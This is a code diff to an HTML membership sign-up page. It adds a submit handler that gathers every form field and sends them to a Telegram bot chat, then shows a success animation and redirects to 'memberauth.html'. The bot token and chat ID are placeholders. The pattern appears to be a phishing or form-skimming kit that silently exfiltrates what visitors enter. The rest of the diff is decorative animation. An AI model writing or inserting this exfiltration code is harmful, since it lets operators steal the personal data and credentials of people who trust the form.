@@ -432,39 +432,58 @@
         </div>
     </footer>
 
-    <script>
-        document.getElementById('membershipForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
+<script>
+document.getElementById('membershipForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
 
-            // Show success modal with enhanced animations
-            const modal = document.getElementById('successModal');
-            modal.style.display = 'flex';
-            modal.style.animation = 'fadeIn 0.5s ease-out';
+    // Gather form data  
+    const formData = new FormData(this);  
+    let message = "New Membership Submission:\n";  
+    formData.forEach((value, key) => {  
+        message += `${key}: ${value}\n`;  
+    });
 
-            // Simulate processing with royal animation
-            await new Promise(resolve => setTimeout(resolve, 3000));
+    // Telegram bot details  
+    const telegramBotToken = 'YOUR_BOT_TOKEN';  
+    const chatId = 'YOUR_CHAT_ID';  
+    const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
 
-            // Redirect to success page
-            setTimeout(() => {
-                window.location.href = 'memberauth.html';
-            }, 3000);
-        });
+    // Send data to Telegram  
+    await fetch(telegramUrl, {  
+        method: 'POST',  
+        headers: { 'Content-Type': 'application/json' },  
+        body: JSON.stringify({ chat_id: chatId, text: message })  
+    });
 
-        // Add subtle floating animation to form container
-        const formContainer = document.querySelector('.form-container');
-        let float = 0;
-        setInterval(() => {
-            float += 0.02;
-            formContainer.style.transform = `translateY(${Math.sin(float) * 5}px)`;
-        }, 50);
+    // Show success modal with enhanced animations  
+    const modal = document.getElementById('successModal');  
+    modal.style.display = 'flex';  
+    modal.style.animation = 'fadeIn 0.5s ease-out';  
 
-        // Add dynamic background pattern movement
-        document.addEventListener('mousemove', (e) => {
-            const pattern = document.querySelector('.geometric-pattern');
-            const x = e.clientX / window.innerWidth;
-            const y = e.clientY / window.innerHeight;
-            pattern.style.transform = `translate(${x * 20}px, ${y * 20}px)`;
-        });
+    // Simulate processing with royal animation  
+    await new Promise(resolve => setTimeout(resolve, 3000));  
+
+    // Redirect to success page  
+    setTimeout(() => {  
+        window.location.href = 'memberauth.html';  
+    }, 3000);  
+});  
+
+// Add subtle floating animation to form container  
+const formContainer = document.querySelector('.form-container');  
+let float = 0;  
+setInterval(() => {  
+    float += 0.02;  
+    formContainer.style.transform = `translateY(${Math.sin(float) * 5}px)`;  
+}, 50);  
+
+// Add dynamic background pattern movement  
+document.addEventListener('mousemove', (e) => {  
+    const pattern = document.querySelector('.geometric-pattern');  
+    const x = e.clientX / window.innerWidth;  
+    const y = e.clientY / window.innerHeight;  
+    pattern.style.transform = `translate(${x * 20}px, ${y * 20}px)`;  
+});
     </script>
 </body>
 </html>
